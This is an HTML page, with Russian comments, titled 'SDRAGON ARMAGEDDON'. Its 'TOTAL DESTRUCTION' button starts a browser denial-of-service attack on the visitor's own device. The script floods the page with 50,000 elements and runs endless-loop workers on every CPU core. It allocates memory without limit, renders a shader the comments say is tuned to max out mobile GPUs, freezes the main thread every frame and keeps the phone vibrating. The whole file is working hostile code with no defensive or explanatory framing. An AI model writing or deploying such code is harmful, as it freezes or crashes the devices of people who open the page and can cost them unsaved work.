<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>SDRAGON ARMAGEDDON</title>
    <style>
        body { margin: 0; background: #000; overflow: hidden; color: #f00; font-family: sans-serif; }
        canvas { width: 100vw; height: 100vh; position: fixed; top: 0; left: 0; z-index: 1; }
        #ui { position: fixed; z-index: 9999; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; }
        button { padding: 40px; background: #f00; color: #fff; font-weight: bold; border: 5px solid #fff; cursor: pointer; font-size: 24px; }
        /* Элементы из 1-й версии для нагрузки DOM */
        .poly { position: absolute; width: 2px; height: 2px; background: red; z-index: 2; pointer-events: none; }
    </style>
</head>
<body>
    <div id="ui">
        <button id="burnBtn" onclick="ignite()">TOTAL DESTRUCTION</button>
    </div>
    <canvas id="c"></canvas>

    <script>
        function ignite() {
            document.getElementById('ui').style.display = 'none';

            // 1. АУДИО-ПЕТЛЯ (Держим фон)
            const ac = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ac.createOscillator();
            const g = ac.createGain();
            g.gain.value = 0.0001;
            osc.connect(g); g.connect(ac.destination);
            osc.start();

            // 2. DOM OVERLOAD (Нагрузка на интерфейс как в 1-й версии)
            // Создаем 50 000 элементов одновременно
            const container = document.body;
            for(let i = 0; i < 50000; i++) {
                const d = document.createElement('div');
                d.className = 'poly';
                d.style.left = Math.random() * 100 + "vw";
                d.style.top = Math.random() * 100 + "vh";
                container.appendChild(d);
            }

            // 3. CPU STORM (Web Workers)
            const workerCode = `while(true){ Math.atan(Math.tan(Math.random())) * Math.sqrt(Math.random()); }`;
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            for(let i = 0; i < (navigator.hardwareConcurrency || 16); i++) {
                new Worker(url);
            }

            // 4. RAM EATER (Экстремальный захват памяти)
            let memoryBuster = [];
            setInterval(() => {
                for(let i = 0; i < 100; i++) {
                    memoryBuster.push(new BigInt64Array(1000000));
                }
            }, 500);

            // 5. GPU NUCLEAR (Рендеринг фрактальной "геометрии")
            const gl = document.getElementById('c').getContext('webgl');
            const prog = gl.createProgram();
            
            const sh = (t, s) => {
                const sdr = gl.createShader(t);
                gl.shaderSource(sdr, s);
                gl.compileShader(sdr);
                gl.attachShader(prog, sdr);
            };

            sh(gl.VERTEX_SHADER, `attribute vec2 p; void main(){gl_Position=vec4(p,0,1);}`);
            sh(gl.FRAGMENT_SHADER, `
                precision highp float;
                uniform float t;
                uniform vec2 r;
                void main(){
                    vec2 uv = (gl_FragCoord.xy * 2.0 - r) / min(r.x, r.y);
                    vec3 col = vec3(0);
                    vec2 z = uv;
                    for(int i=0; i<300; i++){ // 300 итераций - это предел для мобильных GPU
                        z = abs(z) / dot(z,z) - vec2(sin(t*0.05), cos(t*0.08));
                        col += vec3(0.005, 0.001, 0.01) / length(z);
                    }
                    gl_FragColor = vec4(col, 1.0);
                }
            `);
            gl.linkProgram(prog);
            gl.useProgram(prog);

            const b = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, b);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]), gl.STATIC_DRAW);
            const p = gl.getAttribLocation(prog, "p");
            gl.enableVertexAttribArray(p);
            gl.vertexAttribPointer(p, 2, gl.FLOAT, false, 0, 0);

            const ut = gl.getUniformLocation(prog, "t");
            const ur = gl.getUniformLocation(prog, "r");

            function loop(now) {
                // Искусственное замедление основного потока
                let start = Date.now();
                while(Date.now() - start < 50) {} // Замораживаем UI на 50мс каждый кадр

                gl.uniform1f(ut, now * 0.001);
                gl.uniform2f(ur, window.innerWidth, window.innerHeight);
                gl.drawArrays(gl.TRIANGLES, 0, 6);
                requestAnimationFrame(loop);
            }
            requestAnimationFrame(loop);

            // Вибрация (если доступна)
            setInterval(() => { if(navigator.vibrate) navigator.vibrate(2000); }, 2100);
        }
    </script>
</body>
</html>
